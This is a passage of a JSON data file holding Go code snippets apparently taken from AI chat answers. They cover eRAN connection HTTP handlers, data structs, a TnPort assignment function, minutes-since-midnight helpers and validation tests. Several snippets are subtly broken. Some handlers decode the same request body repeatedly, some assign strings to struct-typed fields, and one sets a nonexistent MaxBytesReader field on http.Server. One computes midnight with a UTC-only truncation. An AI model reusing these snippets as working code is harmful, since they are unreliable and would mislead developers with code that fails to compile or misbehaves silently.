    "code": "type EranConnection struct {\n\tId               string                   `json:\"Id\"`\n\tRegion           string                   `json:\"Region\"`\n\tSubNetwork       string                   `json:\"SubNetwork\"`\n\tEUtranCellsGroups EUtranCellsGroups        `json:\"EUtranCellsGroups\"`\n\tName             string                   `json:\"Name\"`\n\tNodes            []string                 `json:\"Nodes\"`\n\tIsLte            bool                     `json:\"isLte\"`\n\tIsEran           bool                     `json:\"isEran\"`\n}\n\ntype EUtranCellsGroups struct {\n\tKcell map[string]EUtranCellInfo `json:\"Kcell\"`\n}\n\ntype EUtranCellInfo struct {\n\tCellname         string  `json:\"Cellname\"`\n\tCarrier          string  `json:\"Carrier\"`\n\tSectorEquipment  string  `json:\"SectorEquipment\"`\n\tRachRsiList      string  `json:\"RachRsiList\"`\n\tSharing          string  `json:\"Sharing\"`\n\tCellId           int     `json:\"CellId\"`\n\tGroupCellId      int     `json:\"GroupCellId\"`\n\tSubCellId        int     `json:\"SubCellId\"`\n\tBandwidth        int     `json:\"Bandwidth\"`\n\tRach             int     `json:\"Rach\"`\n\tDl               int     `json:\"Dl\"`\n\tTac              int     `json:\"Tac\"`\n\tTxPower          float64 `json:\"TxPower\"`\n}\n\ntype SubNetwork struct {\n\t// Define the fields of the SubNetwork struct based on your requirements\n\t// ...\n}\n\ntype Vlan struct {\n\t// Define the fields of the Vlan struct based on your requirements\n\t// ...\n}",
    "filename": "24514d095b2832c205cc1572e8b5857a_2.go"
  },
  {
    "conversation_hash": "24514d095b2832c205cc1572e8b5857a",
    "code_index": 3,
    "language": "Go",
    "libraries": [
      "the"
    ],
    "code": "// encodes object as json string and respond to user\nfunc (s *server) handleEranConnection() http.HandlerFunc {\n\treturn func(w http.ResponseWriter, r *http.Request) {\n\t\teranConnection := &model.EranConnection{} // Create an empty EranConnection struct\n\t\t\n\t\t// Decoding the JSON data from the request body into eranConnection\n\t\tif err := s.decode(w, r, eranConnection); err != nil {\n\t\t\t// Handle decoding errors\n\t\t\ts.error(w, r, http.StatusBadRequest, err)\n\t\t\treturn\n\t\t}\n\t\t\n\t\t// Extract SubNetwork and Name fields\n\t\tsubNetwork := eranConnection.SubNetwork // Assuming SubNetwork is of type model.SubNetwork\n\t\tname := eranConnection.Name\n\t\t\n\t\t// Now you can use subNetwork and name to populate the corresponding models\n\t\t\n\t\tcellular := &model.Cellular{\n\t\t\tSubNetwork: subNetwork,\n\t\t\tName:       name,\n\t\t}\n\t\t\n\t\t// ... Do something with the cellular model\n\t\t\n\t\t// Rest of your code...\n\t\ts.store.EranConnection().Fetch(eranConnection)\n\t\ts.respond(w, r, http.StatusOK, eranConnection)\n\t}\n}",
    "filename": "24514d095b2832c205cc1572e8b5857a_3.go"
  },
  {
    "conversation_hash": "b246d7b2da17d8dfc0138bb74df03401",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "// SubNetwork represents the subnetwork data\ntype SubNetwork struct {\n\tSubNetwork string `json:\"SubNetwork\"`\n\tName       string `json:\"Name\"`\n}",
    "filename": "b246d7b2da17d8dfc0138bb74df03401_0.go"
  },
  {
    "conversation_hash": "b246d7b2da17d8dfc0138bb74df03401",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "func (s *server) handleEranConnection() http.HandlerFunc {\n\treturn func(w http.ResponseWriter, r *http.Request) {\n\t\tcellular := &model.Cellular{}\n\t\tif err := s.decode(w, r, cellular); err != nil {\n\t\t\ts.error(w, r, http.StatusBadRequest, err)\n\t\t\treturn\n\t\t}\n\t\tsubnetwork := &model.SubNetwork{}\n\t\tif err := s.decode(w, r, subnetwork); err != nil {\n\t\t\ts.error(w, r, http.StatusBadRequest, err)\n\t\t\treturn\n\t\t}\n\t\tdata := &model.EranConnection{\n\t\t\tCellular:   *cellular,\n\t\t\tSubNetwork: *subnetwork,\n\t\t}\n\t\tif err := s.decode(w, r, data); err != nil {\n\t\t\ts.error(w, r, http.StatusBadRequest, err)\n\t\t\treturn\n\t\t}\n\t\ts.store.EranConnection().Fetch(data)\n\t\ts.respond(w, r, http.StatusOK, data)\n\t}\n}",
    "filename": "b246d7b2da17d8dfc0138bb74df03401_2.go"
  },
  {
    "conversation_hash": "b246d7b2da17d8dfc0138bb74df03401",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "// CustomCellular represents the custom cellular data with additional fields\ntype CustomCellular struct {\n\tCellular\n\tSubNetwork string `json:\"SubNetwork\"`\n\tName       string `json:\"Name\"`\n}",
    "filename": "b246d7b2da17d8dfc0138bb74df03401_3.go"
  },
  {
    "conversation_hash": "b246d7b2da17d8dfc0138bb74df03401",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "func (s *server) handleEranConnection() http.HandlerFunc {\n\treturn func(w http.ResponseWriter, r *http.Request) {\n\t\tcustomCellular := &model.CustomCellular{}\n\t\tif err := s.decode(w, r, customCellular); err != nil {\n\t\t\ts.error(w, r, http.StatusBadRequest, err)\n\t\t\treturn\n\t\t}\n\t\tsubnetwork := &model.SubNetwork{}\n\t\tif err := s.decode(w, r, subnetwork); err != nil {\n\t\t\ts.error(w, r, http.StatusBadRequest, err)\n\t\t\treturn\n\t\t}\n\t\tdata := &model.EranConnection{\n\t\t\tCellular:   customCellular.Cellular,\n\t\t\tSubNetwork: customCellular.SubNetwork,\n\t\t\tName:       customCellular.Name,\n\t\t}\n\t\tif err := s.decode(w, r, data); err != nil {\n\t\t\ts.error(w, r, http.StatusBadRequest, err)\n\t\t\treturn\n\t\t}\n\t\ts.store.EranConnection().Fetch(data)\n\t\ts.respond(w, r, http.StatusOK, data)\n\t}\n}",
    "filename": "b246d7b2da17d8dfc0138bb74df03401_4.go"
  },
  {
    "conversation_hash": "b246d7b2da17d8dfc0138bb74df03401",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "// CustomSubNetwork represents the custom subnetwork data with additional fields\ntype CustomSubNetwork struct {\n\tSubNetwork\n\tName string `json:\"Name\"`\n}",
    "filename": "b246d7b2da17d8dfc0138bb74df03401_5.go"
  },
  {
    "conversation_hash": "b246d7b2da17d8dfc0138bb74df03401",
    "code_index": 6,
    "language": "Go",
    "libraries": [],
    "code": "func (s *server) handleEranConnection() http.HandlerFunc {\n\treturn func(w http.ResponseWriter, r *http.Request) {\n\t\tcustomSubnetwork := &model.CustomSubNetwork{}\n\t\tif err := s.decode(w, r, customSubnetwork); err != nil {\n\t\t\ts.error(w, r, http.StatusBadRequest, err)\n\t\t\treturn\n\t\t}\n\t\tcellular := &model.Cellular{}\n\t\tif err := s.decode(w, r, cellular); err != nil {\n\t\t\ts.error(w, r, http.StatusBadRequest, err)\n\t\t\treturn\n\t\t}\n\t\tdata := &model.EranConnection{\n\t\t\tCellular:   *cellular,\n\t\t\tSubNetwork: customSubnetwork.SubNetwork,\n\t\t\tName:       customSubnetwork.Name,\n\t\t}\n\t\tif err := s.decode(w, r, data); err != nil {\n\t\t\ts.error(w, r, http.StatusBadRequest, err)\n\t\t\treturn\n\t\t}\n\t\ts.store.EranConnection().Fetch(data)\n\t\ts.respond(w, r, http.StatusOK, data)\n\t}\n}",
    "filename": "b246d7b2da17d8dfc0138bb74df03401_6.go"
  },
  {
    "conversation_hash": "b246d7b2da17d8dfc0138bb74df03401",
    "code_index": 7,
    "language": "Go",
    "libraries": [
      "input"
    ],
    "code": "func (s *server) handleEranConnection() http.HandlerFunc {\n\treturn func(w http.ResponseWriter, r *http.Request) {\n\t\tcellular := &model.Cellular{}\n\t\tif err := s.decode(w, r, cellular); err != nil {\n\t\t\ts.error(w, r, http.StatusBadRequest, err)\n\t\t\treturn\n\t\t}\n\t\tsubnetwork := &model.SubNetwork{}\n\t\tif err := s.decode(w, r, subnetwork); err != nil {\n\t\t\ts.error(w, r, http.StatusBadRequest, err)\n\t\t\treturn\n\t\t}\n\n\t\tvar requestData struct {\n\t\t\tName   string `json:\"Name\"`         // Add any additional fields from input JSON here\n\t\t\tSubNet string `json:\"SubNetwork\"`   // Add any additional fields from input JSON here\n\t\t\t// Add any additional fields from input JSON here\n\t\t}\n\t\tif err := s.decode(w, r, &requestData); err != nil {\n\t\t\ts.error(w, r, http.StatusBadRequest, err)\n\t\t\treturn\n\t\t}\n\n\t\tdata := &model.EranConnection{\n\t\t\tCellular:   *cellular,\n\t\t\tSubNetwork: requestData.SubNet,\n\t\t\tName:       requestData.Name,\n\t\t}\n\t\tif err := s.decode(w, r, data); err != nil {\n\t\t\ts.error(w, r, http.StatusBadRequest, err)\n\t\t\treturn\n\t\t}\n\t\ts.store.EranConnection().Fetch(data)\n\t\ts.respond(w, r, http.StatusOK, data)\n\t}\n}",
    "filename": "b246d7b2da17d8dfc0138bb74df03401_7.go"
  },
  {
    "conversation_hash": "b246d7b2da17d8dfc0138bb74df03401",
    "code_index": 8,
    "language": "Go",
    "libraries": [],
    "code": "func (s *server) handleEranConnection() http.HandlerFunc {\n\treturn func(w http.ResponseWriter, r *http.Request) {\n\t\tcellular := &model.Cellular{}\n\t\tif err := s.decode(w, r, cellular); err != nil {\n\t\t\ts.error(w, r, http.StatusBadRequest, err)\n\t\t\treturn\n\t\t}\n\t\tsubnetwork := &model.SubNetwork{}\n\t\tif err := s.decode(w, r, subnetwork); err != nil {\n\t\t\ts.error(w, r, http.StatusBadRequest, err)\n\t\t\treturn\n\t\t}\n\n\t\tparentData := struct {\n\t\t\tName       string `json:\"Name\"`\n\t\t\tSubNetwork string `json:\"SubNetwork\"`\n\t\t}{}\n\n\t\tif err := s.decode(w, r, &parentData); err != nil {\n\t\t\ts.error(w, r, http.StatusBadRequest, err)\n\t\t\treturn\n\t\t}\n\n\t\tcellular.Name = parentData.Name\n\t\tsubnetwork.Name = parentData.SubNetwork\n\n\t\tdata := &model.EranConnection{\n\t\t\tCellular:   *cellular,\n\t\t\tSubNetwork: *subnetwork,\n\t\t}\n\t\tif err := s.decode(w, r, data); err != nil {\n\t\t\ts.error(w, r, http.StatusBadRequest, err)\n\t\t\treturn\n\t\t}\n\t\ts.store.EranConnection().Fetch(data)\n\t\ts.respond(w, r, http.StatusOK, data)\n\t}\n}",
    "filename": "b246d7b2da17d8dfc0138bb74df03401_8.go"
  },
  {
    "conversation_hash": "5e5d8a3c78990dfd58e0196325b07f9f",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "func (s *server) handleEranConnection() http.HandlerFunc {\n\treturn func(w http.ResponseWriter, r *http.Request) {\n\t\teranConnection := &model.EranConnection{}\n\t\tif err := s.decode(w, r, eranConnection); err != nil {\n\t\t\ts.error(w, r, http.StatusBadRequest, err)\n\t\t\treturn\n\t\t}\n\n\t\ts.store.EranConnection().Fetch(eranConnection)\n\t\ts.respond(w, r, http.StatusOK, eranConnection)\n\t}\n}",
    "filename": "5e5d8a3c78990dfd58e0196325b07f9f_0.go"
  },
  {
    "conversation_hash": "5e5d8a3c78990dfd58e0196325b07f9f",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "func (s *server) handleEranConnection() http.HandlerFunc {\n\treturn func(w http.ResponseWriter, r *http.Request) {\n\t\teranConnection := &model.EranConnection{}\n\t\tif err := s.decode(w, r, eranConnection); err != nil {\n\t\t\ts.error(w, r, http.StatusBadRequest, err)\n\t\t\treturn\n\t\t}\n\n\t\ts.store.EranConnection().Fetch(eranConnection)\n\t\ts.respond(w, r, http.StatusOK, eranConnection)\n\t}\n}",
    "filename": "5e5d8a3c78990dfd58e0196325b07f9f_1.go"
  },
  {
    "conversation_hash": "5e5d8a3c78990dfd58e0196325b07f9f",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "func (s *server) handleEranConnection() http.HandlerFunc {\n\treturn func(w http.ResponseWriter, r *http.Request) {\n\t\teranConnection := &model.EranConnection{}\n\t\tsubnetwork := &model.SubNetwork{} // Add a subnetwork variable\n\t\tif err := s.decode(w, r, subnetwork); err != nil { // Decode into subnetwork\n\t\t\ts.error(w, r, http.StatusBadRequest, err)\n\t\t\treturn\n\t\t}\n\n\t\teranConnection.SubNetwork = *subnetwork // Assign subnetwork to eranConnection\n\t\tif err := s.decode(w, r, eranConnection); err != nil {\n\t\t\ts.error(w, r, http.StatusBadRequest, err)\n\t\t\treturn\n\t\t}\n\n\t\ts.store.EranConnection().Fetch(eranConnection)\n\t\ts.respond(w, r, http.StatusOK, eranConnection)\n\t}\n}",
    "filename": "5e5d8a3c78990dfd58e0196325b07f9f_2.go"
  },
  {
    "conversation_hash": "5e5d8a3c78990dfd58e0196325b07f9f",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "func (s *server) handleEranConnection() http.HandlerFunc {\n\treturn func(w http.ResponseWriter, r *http.Request) {\n\t\teranConnection := &model.EranConnection{}\n\t\tif err := s.decode(w, r, eranConnection); err != nil {\n\t\t\ts.error(w, r, http.StatusBadRequest, err)\n\t\t\treturn\n\t\t}\n\n\t\ts.store.EranConnection().Fetch(eranConnection)\n\t\ts.respond(w, r, http.StatusOK, eranConnection)\n\t}\n}",
    "filename": "5e5d8a3c78990dfd58e0196325b07f9f_3.go"
  },
  {
    "conversation_hash": "5e5d8a3c78990dfd58e0196325b07f9f",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "func (s *server) handleEranConnection() http.HandlerFunc {\n\treturn func(w http.ResponseWriter, r *http.Request) {\n\t\teranConnection := &model.EranConnection{}\n\t\tsubnetwork := &model.SubNetwork{} // Add a subnetwork variable\n\t\tif err := s.decode(w, r, eranConnection); err != nil {\n\t\t\ts.error(w, r, http.StatusBadRequest, err)\n\t\t\treturn\n\t\t}\n\n\t\tif err := s.decode(w, r, subnetwork); err != nil {\n\t\t\ts.error(w, r, http.StatusBadRequest, err)\n\t\t\treturn\n\t\t}\n\n\t\teranConnection.SubNetwork = *subnetwork // Assign subnetwork to eranConnection\n\t\teranConnection.SubNetwork.Name = \"Shymkent\" // Map \"SubNetwork\": \"Shymkent\" explicitly\n\n\t\ts.store.EranConnection().Fetch(eranConnection)\n\t\ts.respond(w, r, http.StatusOK, eranConnection)\n\t}\n}",
    "filename": "5e5d8a3c78990dfd58e0196325b07f9f_4.go"
  },
  {
    "conversation_hash": "5e5d8a3c78990dfd58e0196325b07f9f",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "func (s *server) handleEranConnection() http.HandlerFunc {\n\treturn func(w http.ResponseWriter, r *http.Request) {\n\t\teranConnection := &model.EranConnection{}\n\t\tif err := s.decode(w, r, eranConnection); err != nil {\n\t\t\ts.error(w, r, http.StatusBadRequest, err)\n\t\t\treturn\n\t\t}\n\n\t\teranConnection.SubNetwork = model.SubNetwork{Name: eranConnection.SubNetwork} // Assign JSON field to SubNetwork.Name\n\n\t\ts.store.EranConnection().Fetch(eranConnection)\n\t\ts.respond(w, r, http.StatusOK, eranConnection)\n\t}\n}",
    "filename": "5e5d8a3c78990dfd58e0196325b07f9f_5.go"
  },
  {
    "conversation_hash": "5e5d8a3c78990dfd58e0196325b07f9f",
    "code_index": 6,
    "language": "Go",
    "libraries": [],
    "code": "func (s *server) handleEranConnection() http.HandlerFunc {\n\treturn func(w http.ResponseWriter, r *http.Request) {\n\t\teranConnection := &model.EranConnection{}\n\t\tif err := s.decode(w, r, eranConnection); err != nil {\n\t\t\ts.error(w, r, http.StatusBadRequest, err)\n\t\t\treturn\n\t\t}\n\t\t\n\t\t// Map SubNetwork field to Subnetwork.Name\n\t\teranConnection.SubNetwork = model.SubNetwork{Name: eranConnection.SubNetwork.Name}\n\n\t\ts.store.EranConnection().Fetch(eranConnection)\n\t\ts.respond(w, r, http.StatusOK, eranConnection)\n\t}\n}",
    "filename": "5e5d8a3c78990dfd58e0196325b07f9f_6.go"
  },
  {
    "conversation_hash": "5e5d8a3c78990dfd58e0196325b07f9f",
    "code_index": 7,
    "language": "Go",
    "libraries": [],
    "code": "func (s *server) handleEranConnection() http.HandlerFunc {\n\treturn func(w http.ResponseWriter, r *http.Request) {\n\t\teranConnection := &model.EranConnection{}\n\t\tif err := s.decode(w, r, eranConnection); err != nil {\n\t\t\ts.error(w, r, http.StatusBadRequest, err)\n\t\t\treturn\n\t\t}\n\n\t\tsubnetworkName := struct {\n\t\t\tName string `json:\"SubNetwork\"`\n\t\t}{}\n\t\tif err := s.decode(w, r, &subnetworkName); err != nil {\n\t\t\ts.error(w, r, http.StatusBadRequest, err)\n\t\t\treturn\n\t\t}\n\t\t\n\t\teranConnection.SubNetwork = model.SubNetwork{Name: subnetworkName.Name}\n\n\t\ts.store.EranConnection().Fetch(eranConnection)\n\t\ts.respond(w, r, http.StatusOK, eranConnection)\n\t}\n}",
    "filename": "5e5d8a3c78990dfd58e0196325b07f9f_7.go"
  },
  {
    "conversation_hash": "9690294d86e903f3f7ef6b4f95fadf99",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "func (s *server) handleEranConnection() http.HandlerFunc {\n\treturn func(w http.ResponseWriter, r *http.Request) {\n\t\teranConnection := &model.EranConnection{}\n\t\tcellular := &model.Cellular{}\n\t\tsubNetwork := &model.SubNetwork{}\n\n\t\tif err := s.decode(w, r, cellular); err != nil {\n\t\t\ts.error(w, r, http.StatusBadRequest, err)\n\t\t\treturn\n\t\t}\n\n\t\tif err := s.decode(w, r, subNetwork); err != nil {\n\t\t\ts.error(w, r, http.StatusBadRequest, err)\n\t\t\treturn\n\t\t}\n\n\t\teranConnection.Cellular.Name = cellular.Name\n\t\teranConnection.SubNetwork.Name = subNetwork.Name\n\n\t\ts.store.EranConnection().Fetch(eranConnection)\n\t\ts.respond(w, r, http.StatusOK, eranConnection)\n\t}\n}",
    "filename": "9690294d86e903f3f7ef6b4f95fadf99_0.go"
  },
  {
    "conversation_hash": "9690294d86e903f3f7ef6b4f95fadf99",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "type RequestPayload struct {\n\tCellular    model.Cellular   `json:\"Cellular\"`\n\tSubNetwork  model.SubNetwork `json:\"SubNetwork\"`\n\t// Other fields in the request payload\n}\n\nfunc (s *server) handleEranConnection() http.HandlerFunc {\n\treturn func(w http.ResponseWriter, r *http.Request) {\n\t\tpayload := &RequestPayload{}\n\n\t\tif err := s.decode(w, r, payload); err != nil {\n\t\t\ts.error(w, r, http.StatusBadRequest, err)\n\t\t\treturn\n\t\t}\n\n\t\teranConnection := &model.EranConnection{\n\t\t\tCellular:    payload.Cellular.Name,\n\t\t\tSubNetwork:  payload.SubNetwork.Name,\n\t\t\tConnection:  \"\", // Fill in the appropriate value\n\t\t\tConnections: []string{}, // Fill in the appropriate value\n\t\t\tTnPort:      \"\", // Fill in the appropriate value\n\t\t\tTnPorts:     []string{}, // Fill in the appropriate value\n\t\t}\n\n\t\ts.store.EranConnection().Fetch(eranConnection)\n\t\ts.respond(w, r, http.StatusOK, eranConnection)\n\t}\n}",
    "filename": "9690294d86e903f3f7ef6b4f95fadf99_1.go"
  },
  {
    "conversation_hash": "9690294d86e903f3f7ef6b4f95fadf99",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "func (s *server) handleEranConnection() http.HandlerFunc {\n\treturn func(w http.ResponseWriter, r *http.Request) {\n\t\teranConnection := &model.EranConnection{}\n\t\tcellular := &struct {\n\t\t\tName string `json:\"Name\"`\n\t\t}{}\n\t\tsubNetwork := &struct {\n\t\t\tName string `json:\"SubNetwork\"`\n\t\t}{}\n\n\t\tif err := s.decode(w, r, cellular); err != nil {\n\t\t\ts.error(w, r, http.StatusBadRequest, err)\n\t\t\treturn\n\t\t}\n\n\t\tif err := s.decode(w, r, subNetwork); err != nil {\n\t\t\ts.error(w, r, http.StatusBadRequest, err)\n\t\t\treturn\n\t\t}\n\n\t\teranConnection.Cellular = cellular.Name\n\t\teranConnection.SubNetwork = subNetwork.Name\n\n\t\ts.store.EranConnection().Fetch(eranConnection)\n\t\ts.respond(w, r, http.StatusOK, eranConnection)\n\t}\n}",
    "filename": "9690294d86e903f3f7ef6b4f95fadf99_2.go"
  },
  {
    "conversation_hash": "9690294d86e903f3f7ef6b4f95fadf99",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "func (s *server) handleEranConnection() http.HandlerFunc {\n\treturn func(w http.ResponseWriter, r *http.Request) {\n\t\teranConnection := &model.EranConnection{}\n\t\tcellular := struct {\n\t\t\tName string `json:\"Name\"`\n\t\t}{}\n\t\tsubNetwork := struct {\n\t\t\tName string `json:\"SubNetwork\"`\n\t\t}{}\n\n\t\tif err := s.decode(w, r, &cellular); err != nil {\n\t\t\ts.error(w, r, http.StatusBadRequest, err)\n\t\t\treturn\n\t\t}\n\n\t\tif err := s.decode(w, r, &subNetwork); err != nil {\n\t\t\ts.error(w, r, http.StatusBadRequest, err)\n\t\t\treturn\n\t\t}\n\n\t\teranConnection.Cellular = model.Cellular{ // Update the assignment statement\n\t\t\tName: cellular.Name,\n\t\t}\n\t\teranConnection.SubNetwork = model.SubNetwork{ // Update the assignment statement\n\t\t\tName: subNetwork.Name,\n\t\t}\n\n\t\ts.store.EranConnection().Fetch(eranConnection)\n\t\ts.respond(w, r, http.StatusOK, eranConnection)\n\t}\n}",
    "filename": "9690294d86e903f3f7ef6b4f95fadf99_3.go"
  },
  {
    "conversation_hash": "9690294d86e903f3f7ef6b4f95fadf99",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "func main() {\n    // Create an HTTP server\n    server := &http.Server{\n\t\tAddr:    \":8080\",\n\t\tHandler: router,\n\t\t// Set a higher request body size limit (e.g., 10 MB)\n\t\tMaxBytesReader: 10 * 1024 * 1024, // 10 MB\n\t}\n\n    // Start the server\n\tlog.Printf(\"Server listening at %s\", server.Addr)\n\tlog.Fatal(server.ListenAndServe())\n}",
    "filename": "9690294d86e903f3f7ef6b4f95fadf99_4.go"
  },
  {
    "conversation_hash": "f8d9b30f478778faee8ee7a89c93a103",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "// Assuming Nodes is a slice or array\n\nfunc (elasticran *EranConnection) port() {\n\tname := elasticran.Name\n\tsubNetwork := elasticran.SubNetwork\n\tnodes := elasticran.Nodes\n\n\tif len(nodes) == 1 {\n\t\telasticran.TnPort2 = \"\"\n\t\tif strings.HasPrefix(name, \"GRBS\") {\n\t\t\telasticran.TnPort = \"TN_IDL_C\"\n\t\t} else if strings.HasPrefix(name, \"ERBS\") && strings.Contains(name, \"_1_\") {\n\t\t\tif subNetwork == \"Shymkent\" {\n\t\t\t\telasticran.TnPort = \"TN_IDL_D\"\n\t\t\t} else {\n\t\t\t\telasticran.TnPort = \"TN_B\"\n\t\t\t}\n\t\t} else if strings.HasPrefix(name, \"ERBS\") && strings.Contains(name, \"_2_\") {\n\t\t\tif subNetwork == \"Shymkent\" {\n\t\t\t\telasticran.TnPort = \"TN_IDL_C\"\n\t\t\t} else {\n\t\t\t\telasticran.TnPort = \"TN_A\"\n\t\t\t}\n\t\t}\n\t} else if len(nodes) == 2 {\n\t\tif strings.HasPrefix(name, \"GRBS\") {\n\t\t\telasticran.TnPort = \"TN_IDL_C\"\n\t\t\telasticran.TnPort2 = \"TN_IDL_D\"\n\t\t} else if strings.HasPrefix(name, \"ERBS\") {\n\t\t\tif subNetwork == \"Shymkent\" {\n\t\t\t\telasticran.TnPort = \"TN_IDL_D\"\n\t\t\t\telasticran.TnPort2 = \"TN_IDL_C\"\n\t\t\t} else {\n\t\t\t\telasticran.TnPort = \"TN_B\"\n\t\t\t\telasticran.TnPort2 = \"TN_A\"\n\t\t\t}\n\t\t}\n\t}\n}",
    "filename": "f8d9b30f478778faee8ee7a89c93a103_0.go"
  },
  {
    "conversation_hash": "8f86e50253eef1ece0d8634414f5e937",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"time\"\n)\n\nfunc MinutesPassedToday(currentTime time.Time) int {\n\t// Get the current date and set the time to start of day (midnight)\n\tcurrentDate := currentTime.Truncate(24 * time.Hour)\n\n\t// calculate the duration between the current time and start of day\n\tduration := currentTime.Sub(currentDate)\n\n\t// convert the duration to minutes\n\tminutes := int(duration.Minutes())\n\n\treturn minutes\n}\n\nfunc main() {\n\tcurrentTime := time.Now()\n\tminutesPassed := MinutesPassedToday(currentTime)\n\tfmt.Printf(\"Minutes passed today: %d\\n\", minutesPassed)\n}",
    "filename": "8f86e50253eef1ece0d8634414f5e937_0.go"
  },
  {
    "conversation_hash": "dd71ba231cae8a6dad17c35d5a143e38",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"time\"\n)\n\nfunc MinutesPassedToday(currentTime time.Time) int {\n\t// Calculate the number of minutes passed today using the current time's hour and minute values\n\tminutes := currentTime.Hour()*60 + currentTime.Minute()\n\treturn minutes\n}\n\nfunc main() {\n\t// Get the current time\n\tcurrentTime := time.Now()\n\n\t// Calculate the number of minutes passed today\n\tminutesPassed := MinutesPassedToday(currentTime)\n\n\t// Print the result\n\tfmt.Printf(\"Minutes passed today: %d\\n\", minutesPassed)\n}",
    "filename": "dd71ba231cae8a6dad17c35d5a143e38_0.go"
  },
  {
    "conversation_hash": "9b43e8fbf2fbb4b91a3c8b953b776e99",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "// TestCrElasticRan_Validate tests *model.CrElasticRan.Validate\nfunc TestCrElasticRan_Validate(t *testing.T) {\n\n\t//init test cases\n\tvar cases []CrElasticRanTest = []CrElasticRanTest{\n\t\t{\n\t\t\tName: \"valid crElasticRan integration request\",\n\t\t\tData: func() *CrElasticRan {\n\t\t\t\treturn TestCrElasticRan(t)\n\t\t\t},\n\t\t\tIsValid: true,\n\t\t},\n\t\t{\n\t\t\tName: \"crElasticRan integration request with empty Name\",\n\t\t\tData: func() *CrElasticRan {\n\t\t\t\tdata := TestCrElasticRan(t)\n\t\t\t\tdata.ENodeB.Site.Cellular.Name = \"\"\n\t\t\t\treturn data\n\t\t\t},\n\t\t\tIsValid: false,\n\t\t},\n\t\t{\n\t\t\tName: \"crElasticRan integration request with empty Celldata\",\n\t\t\tData: func() *CrElasticRan {\n\t\t\t\tdata := TestCrElasticRan(t)\n\t\t\t\tdata.EUtranCellData.CellsGroups = nil\n\t\t\t\treturn data\n\t\t\t},\n\t\t\tIsValid: false,\n\t\t},\n\t}\n\n\t//run tests\n\tfor _, test := range cases {\n\t\tt.Run(test.Name, func(t *testing.T) {\n\t\t\tif test.IsValid {\n\t\t\t\tassert.NoError(t, test.Data().Validate())\n\t\t\t} else {\n\t\t\t\tassert.Error(t, test.Data().Validate())\n\t\t\t}\n\t\t})\n\t}\n}",
    "filename": "9b43e8fbf2fbb4b91a3c8b953b776e99_0.go"
  },
  {
    "conversation_hash": "9b43e8fbf2fbb4b91a3c8b953b776e99",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "// TestCrElasticRan_Validate tests *model.CrElasticRan.Validate\nfunc TestCrElasticRan_Validate(t *testing.T) {\n\n\t//init test cases\n\tvar cases []CrElasticRanTest = []CrElasticRanTest{\n\t\t{\n\t\t\tName: \"valid crElasticRan integration request\",\n\t\t\tData: func() *CrElasticRan {\n\t\t\t\treturn TestCrElasticRan(t)\n\t\t\t},\n\t\t\tIsValid: true,\n\t\t},\n\t\t{\n\t\t\tName: \"crElasticRan integration request with empty Name\",\n\t\t\tData: func() *CrElasticRan {\n\t\t\t\tdata := TestCrElasticRan(t)\n\t\t\t\tdata.ENodeB.Site.Cellular.Name = \"\"\n\t\t\t\treturn data\n\t\t\t},\n\t\t\tIsValid: false,\n\t\t},\n\t\t{\n\t\t\tName: \"crElasticRan integration request with empty Celldata\",\n\t\t\tData: func() *CrElasticRan {\n\t\t\t\tdata := TestCrElasticRan(t)\n\t\t\t\tdata.EUtranCellData.CellsGroups = []CellGroup{} // set as empty slice\n\t\t\t\treturn data\n\t\t\t},\n\t\t\tIsValid: false,\n\t\t},\n\t}\n\n\t//run tests\n\tfor _, test := range cases {\n\t\tt.Run(test.Name, func(t *testing.T) {\n\t\t\tif test.IsValid {\n\t\t\t\tassert.NoError(t, test.Data().Validate())\n\t\t\t} else {\n\t\t\t\tassert.Error(t, test.Data().Validate())\n\t\t\t}\n\t\t})\n\t}\n}",
    "filename": "9b43e8fbf2fbb4b91a3c8b953b776e99_1.go"
  },
  {
    "conversation_hash": "9b43e8fbf2fbb4b91a3c8b953b776e99",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "// TestCrElasticRan_Validate tests *model.CrElasticRan.Validate\nfunc TestCrElasticRan_Validate(t *testing.T) {\n\n\t//init test cases\n\tvar cases []CrElasticRanTest = []CrElasticRanTest{\n\t\t{\n\t\t\tName: \"valid crElasticRan integration request\",\n\t\t\tData: func() *CrElasticRan {\n\t\t\t\treturn TestCrElasticRan(t)\n\t\t\t},\n\t\t\tIsValid: true,\n\t\t},\n\t\t{\n\t\t\tName: \"crElasticRan integration request with empty Name\",\n\t\t\tData: func() *CrElasticRan {\n\t\t\t\tdata := TestCrElasticRan(t)\n\t\t\t\tdata.ENodeB.Site.Cellular.Name = \"\"\n\t\t\t\treturn data\n\t\t\t},\n\t\t\tIsValid: false,\n\t\t},\n\t\t{\n\t\t\tName: \"crElasticRan integration request with empty Celldata\",\n\t\t\tData: func() *CrElasticRan {\n\t\t\t\tdata := TestCrElasticRan(t)\n\t\t\t\tdata.EUtranCellData.CellsGroups = make(map[string]*Eutrancells) // set as empty map\n\t\t\t\treturn data\n\t\t\t},\n\t\t\tIsValid: false,\n\t\t},\n\t}\n\n\t//run tests\n\tfor _, test := range cases {\n\t\tt.Run(test.Name, func(t *testing.T) {\n\t\t\tif test.IsValid {\n\t\t\t\tassert.NoError(t, test.Data().Validate())\n\t\t\t} else {\n\t\t\t\tassert.Error(t, 